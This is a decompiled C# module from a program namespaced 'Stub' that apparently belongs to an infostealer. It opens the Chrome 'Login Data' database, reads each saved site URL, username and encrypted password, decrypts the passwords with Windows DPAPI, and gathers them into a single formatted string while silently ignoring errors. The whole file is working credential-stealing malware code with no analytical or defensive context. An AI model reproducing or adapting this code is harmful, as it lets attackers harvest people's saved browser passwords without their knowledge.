using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000019 RID: 25
	[StandardModule]
	internal sealed class Chrome
	{
		// Token: 0x06000086 RID: 134 RVA: 0x00004D34 File Offset: 0x00002F34
		public static void Gchrome()
		{
			checked
			{
				try
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
					SQLiteHandler sqliteHandler = new SQLiteHandler(text);
					sqliteHandler.ReadTable("logins");
					bool flag = File.Exists(text);
					if (flag)
					{
						int num = 0;
						int num2 = sqliteHandler.GetRowCount() - 1;
						int num3 = num;
						for (;;)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							string value = sqliteHandler.GetValue(num3, "origin_url");
							string value2 = sqliteHandler.GetValue(num3, "username_value");
							string text2 = Chrome.Decrypt(Encoding.Default.GetBytes(sqliteHandler.GetValue(num3, "password_value")));
							flag = (Operators.CompareString(value2, "", false) != 0 & Operators.CompareString(text2, "", false) != 0);
							if (flag)
							{
								p.OL = string.Concat(new string[]
								{
									p.OL,
									"|URL| ",
									value,
									"\r\n|USR| ",
									value2,
									"\r\n|PWD| ",
									text2,
									"\r\n"
								});
							}
							num3++;
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000087 RID: 135
		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Chrome.DATA_BLOB pDataIn, string szDataDescr, ref Chrome.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref Chrome.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref Chrome.DATA_BLOB pDataOut);

		// Token: 0x06000088 RID: 136 RVA: 0x00004E98 File Offset: 0x00003098
		public static string Decrypt(byte[] Datas)
		{
			Chrome.DATA_BLOB data_BLOB = default(Chrome.DATA_BLOB);
			Chrome.DATA_BLOB data_BLOB2 = default(Chrome.DATA_BLOB);
			GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
			data_BLOB.pbData = gchandle.AddrOfPinnedObject();
			data_BLOB.cbData = Datas.Length;
			gchandle.Free();
			string szDataDescr = null;
			Chrome.DATA_BLOB data_BLOB4;
			Chrome.DATA_BLOB data_BLOB3 = data_BLOB4;
			IntPtr intPtr;
			IntPtr pvReserved = intPtr;
			Chrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT2;
			Chrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = cryptprotect_PROMPTSTRUCT2;
			Chrome.CryptUnprotectData(ref data_BLOB, szDataDescr, ref data_BLOB3, pvReserved, ref cryptprotect_PROMPTSTRUCT, 0, ref data_BLOB2);
			checked
			{
				byte[] array = new byte[data_BLOB2.cbData + 1];
				Marshal.Copy(data_BLOB2.pbData, array, 0, data_BLOB2.cbData);
				string @string = Encoding.Default.GetString(array);
				return @string.Substring(0, @string.Length - 1);
			}
		}

		// Token: 0x0200001A RID: 26
		[Flags]
		public enum CryptProtectPromptFlags
		{
			// Token: 0x04000035 RID: 53
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
			// Token: 0x04000036 RID: 54
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		}

		// Token: 0x0200001B RID: 27
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct CRYPTPROTECT_PROMPTSTRUCT
		{
			// Token: 0x04000037 RID: 55
			public int cbSize;

			// Token: 0x04000038 RID: 56
			public Chrome.CryptProtectPromptFlags dwPromptFlags;

			// Token: 0x04000039 RID: 57
			public IntPtr hwndApp;

			// Token: 0x0400003A RID: 58
			public string szPrompt;
		}

		// Token: 0x0200001C RID: 28
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DATA_BLOB
		{
			// Token: 0x0400003B RID: 59
			public int cbData;

			// Token: 0x0400003C RID: 60
			public IntPtr pbData;
		}
	}
}
